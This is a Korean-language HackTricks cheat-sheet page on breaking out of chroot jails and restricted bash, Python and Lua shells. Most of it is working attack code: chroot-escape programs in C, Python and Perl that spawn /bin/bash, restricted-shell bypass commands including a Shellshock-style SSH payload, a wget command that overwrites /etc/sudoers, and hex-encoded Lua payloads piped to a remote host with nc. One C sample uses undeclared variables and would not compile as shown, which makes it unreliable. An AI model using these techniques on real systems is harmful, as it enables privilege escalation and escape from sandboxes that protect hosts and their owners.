# 감옥 탈출

{% hint style="success" %}
AWS 해킹을 배우고 실습하세요:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP 해킹을 배우고 실습하세요: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks 지원하기</summary>

* [**구독 요금제**](https://github.com/sponsors/carlospolop)를 확인하세요!
* 💬 [**디스코드 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **가입**하거나 **트위터** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**를 팔로우**하세요.
* **HackTricks** 및 **HackTricks Cloud** 깃허브 저장소에 PR을 제출하여 해킹 요령을 공유하세요.

</details>
{% endhint %}

## **GTFOBins**

**"Shell" 속성을 가진 바이너리를 실행할 수 있는지 확인하려면** [**https://gtfobins.github.io/**](https://gtfobins.github.io) **에서 검색하세요**

## Chroot 탈출

[wikipedia](https://en.wikipedia.org/wiki/Chroot#Limitations)에서: chroot 메커니즘은 **root 권한을 가진 의도적인 변조에 대항하기 위한 것이 아니다**. 대부분의 시스템에서 chroot 컨텍스트는 제대로 쌓이지 않으며 충분한 권한을 가진 chrooted 프로그램은 **탈출하기 위해 두 번째 chroot를 수행**할 수 있다.\
보통 이는 탈출하기 위해 chroot 내에서 root가 되어야 한다는 것을 의미한다.

{% hint style="success" %}
**chw00t** **도구**는 [**chw00t**](https://github.com/earthquake/chw00t) 다음 시나리오를 악용하고 `chroot`에서 탈출하는 데 사용됩니다.
{% endhint %}

### Root + CWD

{% hint style="warning" %}
만약 chroot 내에서 **root** 권한을 가지고 있다면 **다른 chroot를 생성**하여 탈출할 수 있습니다. Linux에서 2개의 chroot가 공존할 수 없기 때문에 새 폴더를 만들고 그 새 폴더에서 **새 chroot를 생성**하면 **새 chroot 바깥에 있게** 되어 **새 chroot 바깥에** 있게 됩니다.

일반적으로 chroot는 작업 디렉토리를 지정한 곳으로 이동시키지 않기 때문에 chroot를 생성할 수 있지만 그 바깥에 있을 수 있습니다.
{% endhint %}

보통 chroot 감옥 안에 `chroot` 바이너리를 찾을 수 없지만 **바이너리를 컴파일하고 업로드하고 실행**할 수 있습니다:

<details>

<summary>C: break_chroot.c</summary>
```c
#include <sys/stat.h>
#include <stdlib.h>
#include <unistd.h>

//gcc break_chroot.c -o break_chroot

int main(void)
{
mkdir("chroot-dir", 0755);
chroot("chroot-dir");
for(int i = 0; i < 1000; i++) {
chdir("..");
}
chroot(".");
system("/bin/bash");
}
```
</details>

<details>

<summary>파이썬</summary>
```python
#!/usr/bin/python
import os
os.mkdir("chroot-dir")
os.chroot("chroot-dir")
for i in range(1000):
os.chdir("..")
os.chroot(".")
os.system("/bin/bash")
```
</details>

<details>

<summary>펄 (Perl)</summary>
```perl
#!/usr/bin/perl
mkdir "chroot-dir";
chroot "chroot-dir";
foreach my $i (0..1000) {
chdir ".."
}
chroot ".";
system("/bin/bash");
```
</details>

### 루트 + 저장된 fd

{% hint style="warning" %}
이것은 이전 경우와 유사하지만, 이 경우 **공격자는 현재 디렉토리에 파일 디스크립터를 저장**한 다음 **새 폴더에서 chroot를 생성**합니다. 마지막으로, 그가 chroot 외부에서 해당 **FD에 액세스할 수 있기 때문에** 해당 FD에 액세스하여 **탈출**합니다.
{% endhint %}

<details>

<summary>C: break_chroot.c</summary>
```c
#include <sys/stat.h>
#include <stdlib.h>
#include <unistd.h>

//gcc break_chroot.c -o break_chroot

int main(void)
{
mkdir("tmpdir", 0755);
dir_fd = open(".", O_RDONLY);
if(chroot("tmpdir")){
perror("chroot");
}
fchdir(dir_fd);
close(dir_fd);
for(x = 0; x < 1000; x++) chdir("..");
chroot(".");
}
```
</details>

### 루트 + 포크 + UDS (유닉스 도메인 소켓)

{% hint style="warning" %}
UDS를 통해 FD를 전달할 수 있으므로:

* 자식 프로세스(fork) 생성
* 부모 및 자식이 통신할 수 있는 UDS 생성
* 다른 폴더에서 자식 프로세스에서 chroot 실행
* 부모 프로세스에서 새 자식 프로세스 chroot 외부의 폴더의 FD 생성
* UDS를 사용하여 해당 FD를 자식 프로세스에 전달
* 자식 프로세스가 해당 FD로 chdir하면 chroot 외부에 있기 때문에 감옥을 탈출할 수 있습니다.
{% endhint %}

### 루트 + 마운트

{% hint style="warning" %}
* 루트 디바이스 (/)를 chroot 내부 디렉토리로 마운트
* 해당 디렉토리로 chroot
이것은 Linux에서 가능합니다.
{% endhint %}

### 루트 + /proc

{% hint style="warning" %}
* procfs를 chroot 내부 디렉토리로 마운트 (아직 마운트되지 않은 경우)
* 루트/cwd 항목이 다른 pid를 찾아보세요. 예: /proc/1/root
* 해당 항목으로 chroot
{% endhint %}

### 루트(?) + 포크

{% hint style="warning" %}
* 포크(자식 프로세스)를 생성하고 FS 내부의 다른 폴더로 chroot하고 CD를 실행합니다.
* 부모 프로세스에서 자식 프로세스가 있는 폴더를 자식의 chroot 이전 폴더로 이동합니다.
* 이 자식 프로세스는 chroot 외부에 자신이 있는 것을 발견할 것입니다.
{% endhint %}

### ptrace

{% hint style="warning" %}
* 예전에 사용자들은 자신의 프로세스를 자신의 프로세스에서 디버깅할 수 있었지만, 이제는 기본적으로 불가능합니다.
* 그래도 가능하다면 프로세스로 ptrace하여 해당 프로세스 내에서 셸코드를 실행할 수 있습니다 ([이 예제 참조](linux-capabilities.md#cap\_sys\_ptrace)).
{% endhint %}

## Bash 감옥

### 열거

감옥에 대한 정보 가져오기:
```bash
echo $SHELL
echo $PATH
env
export
pwd
```
### PATH 수정

PATH 환경 변수를 수정할 수 있는지 확인합니다.
```bash
echo $PATH #See the path of the executables that you can use
PATH=/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin #Try to change the path
echo /home/* #List directory
```
### vim 사용하기
```bash
:set shell=/bin/sh
:shell
```
### 스크립트 생성

_/bin/bash_를 내용으로 하는 실행 가능한 파일을 생성할 수 있는지 확인합니다.
```bash
red /bin/bash
> w wx/path #Write /bin/bash in a writable and executable path
```
### SSH를 통해 bash 얻기

SSH를 통해 액세스하는 경우 다음 트릭을 사용하여 bash 셸을 실행할 수 있습니다:
```bash
ssh -t user@<IP> bash # Get directly an interactive shell
ssh user@<IP> -t "bash --noprofile -i"
ssh user@<IP> -t "() { :; }; sh -i "
```
### 선언하기
```bash
declare -n PATH; export PATH=/bin;bash -i

BASH_CMDS[shell]=/bin/bash;shell -i
```
### Wget

예를 들어 sudoers 파일을 덮어쓸 수 있습니다.
```bash
wget http://127.0.0.1:8080/sudoers -O /etc/sudoers
```
### 다른 속임수

[**https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/**](https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/)\
[https://pen-testing.sans.org/blog/2012/0**b**6/06/escaping-restricted-linux-shells](https://pen-testing.sans.org/blog/2012/06/06/escaping-restricted-linux-shells)\
[https://gtfobins.github.io](https://gtfobins.github.io)\
**또한 다음 페이지도 흥미로울 수 있습니다:**

{% content-ref url="../bypass-bash-restrictions/" %}
[bypass-bash-restrictions](../bypass-bash-restrictions/)
{% endcontent-ref %}

## Python 감옥

다음 페이지에서 파이썬 감옥을 탈출하는 속임수에 대해 알아볼 수 있습니다:

{% content-ref url="../../generic-methodologies-and-resources/python/bypass-python-sandboxes/" %}
[bypass-python-sandboxes](../../generic-methodologies-and-resources/python/bypass-python-sandboxes/)
{% endcontent-ref %}

## Lua 감옥

이 페이지에서는 루아 내에서 액세스할 수 있는 전역 함수를 찾을 수 있습니다: [https://www.gammon.com.au/scripts/doc.php?general=lua\_base](https://www.gammon.com.au/scripts/doc.php?general=lua\_base)

**명령 실행과 함께 Eval:**
```bash
load(string.char(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))()
```
일부 라이브러리의 함수를 **점을 사용하지 않고 호출하는 데 사용되는 몇 가지 트릭**은 다음과 같습니다:
```bash
print(string.char(0x41, 0x42))
print(rawget(string, "char")(0x41, 0x42))
```
라이브러리의 함수를 나열하십시오:
```bash
for k,v in pairs(string) do print(k,v) end
```
참고로 **다른 lua 환경에서 이전 원 라이너를 실행할 때 함수의 순서가 변경**됩니다. 따라서 특정 함수를 실행해야 할 경우 다른 lua 환경을 로드하고 le 라이브러리의 첫 번째 함수를 호출하는 브루트 포스 공격을 수행할 수 있습니다:
```bash
#In this scenario you could BF the victim that is generating a new lua environment
#for every interaction with the following line and when you are lucky
#the char function is going to be executed
for k,chr in pairs(string) do print(chr(0x6f,0x73,0x2e,0x65,0x78)) end

#This attack from a CTF can be used to try to chain the function execute from "os" library
#and "char" from string library, and the use both to execute a command
for i in seq 1000; do echo "for k1,chr in pairs(string) do for k2,exec in pairs(os) do print(k1,k2) print(exec(chr(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))) break end break end" | nc 10.10.10.10 10006 | grep -A5 "Code: char"; done
```
**대화형 lua 셸 가져오기**: 제한된 lua 셸 내부에 있다면 다음을 호출하여 새로운 lua 셸(그리고 희망적으로 무제한)을 얻을 수 있습니다:
```bash
debug.debug()
```
## 참고 자료

* [https://www.youtube.com/watch?v=UO618TeyCWo](https://www.youtube.com/watch?v=UO618TeyCWo) (슬라이드: [https://deepsec.net/docs/Slides/2015/Chw00t\_How\_To\_Break%20Out\_from\_Various\_Chroot\_Solutions\_-\_Bucsay\_Balazs.pdf](https://deepsec.net/docs/Slides/2015/Chw00t\_How\_To\_Break%20Out\_from\_Various\_Chroot\_Solutions\_-\_Bucsay\_Balazs.pdf))

{% hint style="success" %}
AWS 해킹 학습 및 실습:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP 해킹 학습 및 실습: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks 지원</summary>

* [**구독 요금제**](https://github.com/sponsors/carlospolop)를 확인하세요!
* 💬 [**디스코드 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **트위터** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**를 팔로우**하세요.
* 해킹 요령을 공유하려면 **HackTricks** 및 **HackTricks Cloud** 깃허브 저장소로 PR을 제출하세요.

</details>
{% endhint %}
